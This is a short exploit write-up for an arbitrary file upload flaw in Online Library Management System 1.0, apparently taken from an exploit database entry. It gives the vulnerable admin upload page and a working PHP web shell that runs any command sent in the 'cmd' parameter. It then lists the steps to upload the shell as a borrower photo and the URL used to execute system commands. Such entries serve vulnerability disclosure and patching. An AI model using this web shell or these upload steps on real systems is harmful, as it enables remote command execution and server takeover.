---
title: "Online Library Management System 1.0 - Arbitrary File Upload"
date: 2020-10-22T10:57:56-03:00
draft: false
type: "local"
platform: "windows"
---

```html

#Vulnerable Page: http://localhost/librarysystem/admin/borrower/index.php?view=add

#Exploit
	Fill details
	Create php shell code with below script
		<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
	Click on Browse
	Select php file
	Click Save
	Access below URL:
		http://localhost/librarysystem/admin/borrower/photos/23102020080814backdoor.php?cmd=dir
	add system commands after cmd to execute it.


.